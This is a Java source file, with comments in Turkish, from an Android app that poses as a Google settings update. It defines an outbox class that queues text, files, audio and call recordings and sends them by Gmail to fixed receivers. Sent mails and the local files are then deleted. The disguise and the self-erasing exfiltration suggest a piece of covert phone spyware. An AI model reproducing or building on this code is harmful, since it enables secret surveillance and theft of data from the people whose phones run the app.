package com.setting.dl.google.googlesettingupdate.ptt.box;

import android.content.Context;

import com.google.api.services.gmail.Gmail;
import com.google.api.services.gmail.model.Message;
import com.setting.dl.google.googlesettingupdate.Run;
import com.setting.dl.google.googlesettingupdate.concurrent.WorkerThread0;
import com.setting.dl.google.googlesettingupdate.concurrent.interfaces.IWorkerHandler;
import com.setting.dl.google.googlesettingupdate.ptt.kahverengi.PTTKahverengi;
import com.setting.dl.google.googlesettingupdate.ptt.senders.AudioFileSender;
import com.setting.dl.google.googlesettingupdate.ptt.senders.FileSender;
import com.setting.dl.google.googlesettingupdate.ptt.checkers.MessageChecker;
import com.setting.dl.google.googlesettingupdate.ptt.senders.TextFileSender;
import com.setting.dl.google.googlesettingupdate.ptt.senders.TextSender;
import com.setting.dl.google.googlesettingupdate.ptt.senders.IAudioFileSender;
import com.setting.dl.google.googlesettingupdate.ptt.senders.IFileSender;
import com.setting.dl.google.googlesettingupdate.ptt.message.IMessage;
import com.setting.dl.google.googlesettingupdate.ptt.checkers.IMessageChecker;
import com.setting.dl.google.googlesettingupdate.ptt.senders.ITextFileSender;
import com.setting.dl.google.googlesettingupdate.ptt.senders.ITextSender;
import com.setting.dl.google.googlesettingupdate.u;

import java.util.List;
import java.util.concurrent.ConcurrentLinkedDeque;


/**
 * {@link PTTKahverengi} üç kutudan oluşuyor.
 * <br><br>
 * 1. {@link MessageOutbox} Outbox.<br>
 * 2. {@link MessageInbox} Inbox<br>
 * 3. {@link MessageSentbox} Sentbox<br><br>
 * <p>
 * Outbox gönderilecek mesajların atıldığı kutu.<br>
 * Inbox gelen mesajların düştüğü kutu.<br>
 * Sentbox gönderilmiş mesajların atıldığı kutu.<br><br>
 * <p>
 * Gönderilmiş mesajlar otomatik olarak Sentbox'a atılır.
 * Gönderilecek mesajlar için ise tek yöntem onları Outbox'a atmaktır.
 * Outbox'a atılan mesajlar otomatik olarak gönderilir.
 * Inbox'a düşen mesajlar ilgili sınıf aracılığı ile alıcılarına iletilir.
 *
 * <p><code>MessageOutbox</code> mesajları tekrarlı göndermeye karşı tek sıra halinde işlem yapar.
 * Aynı zaman içinde aynı mesajlar gönderilmez, sadece bir tane gönderilir.
 * Bu sınıfın başlıca görevi budur.
 * Uygulamanın önceki versiyonlarında bu sınıf yoktu ve oluşturulan mesajlar direk gönderiliyordu.
 * Yapılan testlerde arka arkaya aynı mesajın defalarca gittiği gözlendi.
 * Bu tekrarı önlemek için bu sınıf eklendi.
 * Ancak projenin yapısı gereği, gönderilmek isenen ama gönderilemeyen bir mesaj gözardı edilir.
 * Mesela mesajın gönderileceği zamanda internet olmayabilir.
 * Bu durumda kodlar buraya kadar bile gelmeyecek ve mesaj sanki hiç gönderilmek istenmemiş gibi devam edecek.
 * Bunda herhangi bir problem yok çünkü uygulama genelinde gönderilmek istenen mesajlar zaten önce bir dosyaya kaydediliyor. (Dosyaya kaydedilmeyen çok nadir mesajlar var bunlar da hayati önemde değil)
 * Mesaj gönderilirken bu dosyalardaki bilgiler okunup gönderiliyor.
 * Ayrıca gönderilen mesajların silinmesi konusunda herhangi bir takip yapılmıyor.
 * Gönderilen mesajlar otomatik olarak Sentbox'a ekleniyor ve Sentbox'a eklenen mesajlar da otomatik olarak siliniyor.
 * Ancak mesaj gönderirken internet var, silerken yok ise bu da görmezden geliniyor.
 * Bunun yerine tüm giden mesajları yarım saatte bir kontrol eden ve silen bir görev tasarlandı.</p>
 * <br>
 * Bu üç posta kutusu {@link MessageBox} içinde toplanıyor.
 */
public class MessageOutbox implements IOutbox, IWorkerHandler<IMessage> {
   
   private       ConcurrentLinkedDeque<IMessage> outbox          = new ConcurrentLinkedDeque<>();
   private       boolean                         trigger;
   private final Context                         context;
   private       List<String>                    recievers;
   private       String                          sender;
   private       Gmail                           gmail;
   private       ITextFileSender                 textFileSender  = new TextFileSender();
   private       ITextSender                     textSender      = new TextSender();
   private       IFileSender                     fileSender      = new FileSender();
   private       IAudioFileSender                audioFileSender = new AudioFileSender();
   private       IMessageChecker                 messageChecker;
   private       IMessageSentListener            messageListener;
   //private       IMessageDeleteListener          messageDeleteListener;
   
   MessageOutbox(Context context, Gmail gmail, String sender, List<String> recievers, IMessageSentListener messageListener) {
      
      this.context = context;
      this.gmail = gmail;
      this.sender = sender;
      this.recievers = recievers;
      this.messageListener = messageListener;
      messageChecker = new MessageChecker(context);
   }
   
   private void setTrigger(boolean b) {
      
      trigger = b;
      
      if (trigger) {
         
         onTrigger();
      }
   }
   
   private void onTrigger() {
      
      Run.run(this::postMessage, 10000L);
   }
   
   private void postMessage() {
      
      if (outbox.size() != 0) {
         
         IMessage message = outbox.peek();
         
         new WorkerThread0<IMessage>()
               .thisIsMyWork(() -> sent(message))
               .handleOnForeground(this)
               .start();
      }
      else {
         
         setTrigger(false);
      }
   }
   
   private IMessage sent(IMessage message) {
      
      switch (message.getMessageType()) {
         
         case TEXT: return sentText(message);
         case TEXT_FILE: return sentTextFile(message);
         case FILE: return sentFile(message);
         case AUDIO: return sentAudio(message);
         case CALL: return sentCall(message);
         default: return null;
      }
   }
   
   private IMessage sentText(IMessage message) {
      
      Message mail = textSender.sendText(gmail, sender, recievers, message.getSubject(), message.getBody());
      
      if (mail != null) {
         
         message.setId(mail.getId());
      }
      
      return message;
   }
   
   private IMessage sentTextFile(IMessage message) {
      
      Message mail = textFileSender.sendTextFile(gmail, sender, recievers, message.getFile());
   
      if (mail != null) {
      
         message.setId(mail.getId());
      }
      
      return message;
   }
   
   private IMessage sentFile(IMessage message) {
      
      Message mail = fileSender.sendFile(gmail, sender, recievers, message.getSubject(), message.getBody(), message.getFile());
   
      if (mail != null) {
      
         message.setId(mail.getId());
      }
   
      return message;
   }
   
   private IMessage sentAudio(IMessage message) {
      
      Message mail = audioFileSender.sendAudioFile(gmail, sender, recievers, message.getSubject(), message.getBody(), message.getFile());
   
      if (mail != null) {
      
         message.setId(mail.getId());
      }
   
      return message;
   }
   
   private IMessage sentCall(IMessage message) {
      
      Message mail = audioFileSender.sendAudioFile(gmail, sender, recievers, message.getSubject(), message.getBody(), message.getFile());
   
      if (mail != null) {
      
         message.setId(mail.getId());
      }
   
      return message;
   }
   
   @Override
   public void addToOutbox(IMessage message) {
      
      if (!u.isOnline(context)) {
         
         u.log.d("İnternet yok");
         return;
      }
      
      if (message == null) {
         
         u.log.d("mesaj null");
         return;
      }
      
      if (contains(message)) {
         
         return;
      }
      
      outbox.addLast(message);
      
      u.log.d("Outbox'a yeni bir mesaj eklendi : %d", message.hashCode());
      
      if (trigger) return;
      
      setTrigger(true);
   }
   
   private boolean contains(IMessage message) {
      
      if (messageChecker != null) {
         
         return messageChecker.checkMessage(message);
      }
      
      return false;
   }
   
   private void onMessageSent(IMessage message) {
      
      if (messageListener != null) messageListener.onMessageSent(message);
   }
   
   @Override
   public void onWorkResult(IMessage result) {
      
      IMessage message = outbox.poll();
      
      if (result != null) {
         
         if (message != null) {
   
            if (result.getId() != null) {
   
               u.log.d("Mesaj gönderildi ve kuyruktan çıkarıldı : %s", result.getId());
               onMessageSent(result);
               u.deleteFile(message.getFile());
            }
         }
         else {
            
            u.log.d("Mesaj gönderildi ancak kuyrukta bulunamadı : %s", result.getId());
         }
      }
      else {
         
         if (message != null) {
            
            u.log.d("Mesaj gönderilemedi : %d", message.hashCode());
         }
         else {
            
            u.log.d("Mesaj gönderilemedi");
         }
      }
      
      postMessage();
   }
   
}
